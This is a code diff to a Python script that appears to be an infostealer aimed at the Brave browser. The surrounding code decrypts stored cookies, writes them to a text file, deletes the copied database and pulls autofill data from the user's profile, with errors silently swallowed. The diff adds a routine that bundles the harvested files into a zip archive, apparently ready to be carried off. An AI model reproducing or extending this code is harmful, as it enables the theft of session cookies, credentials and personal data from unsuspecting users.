@@ -3,6 +3,7 @@ import shutil
 import base64
 import json
 import os
+import zipfile
 #import requests
 #import threading
 #import sys
@@ -186,7 +187,7 @@ def decrypt_fetch_cookies(dir, keyDir):
             name, value, host_key, path, expires_utc, is_secure, is_httponly, creation_utc = row
             
             cookie = f"\nName: {name}\nValue: {decrypt_string(value, key)}\nDomain: {host_key}\nPath: {path}\nExpires: {expires_utc}\nCreation: {creation_utc}\nSecure: {is_secure}\nHttponly: {is_httponly}\n"
-            store_data("Brave-cookies.txt", cookie)
+            store_data("decrypted-cookies.txt", cookie)
         conn.close()
         delete_file("cookies.db")
     except:
@@ -353,3 +354,21 @@ def fetch_autofill(dir):
         pass
     
 fetch_autofill(r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Web Data")
+
+
+##
+##Zip files
+##
+
+def zip(name, files):
+    try:
+        with zipfile.ZipFile(name, "w") as zip:
+            for file in files:
+                try:
+                    zip.write(file)
+                except:
+                    pass
+    except:
+        pass
+    
+zip("Brave.zip", ["file1.txt", "file3.txt", "file2.txt"])
